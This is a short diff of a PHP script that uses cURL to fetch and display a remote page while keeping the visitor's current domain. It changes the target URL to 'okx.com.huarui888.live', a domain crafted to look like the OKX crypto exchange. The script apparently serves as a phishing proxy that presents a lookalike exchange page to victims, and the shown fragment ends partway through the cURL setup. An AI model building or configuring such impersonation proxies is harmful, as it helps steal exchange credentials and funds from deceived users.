@@ -1,6 +1,6 @@
 <?php
 // 使用 cURL 获取目标页面内容并显示，保持当前域名
-$url = "http://www.huarui888.live/";
+$url = "https://www.okx.com.huarui888.live/index.html";
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
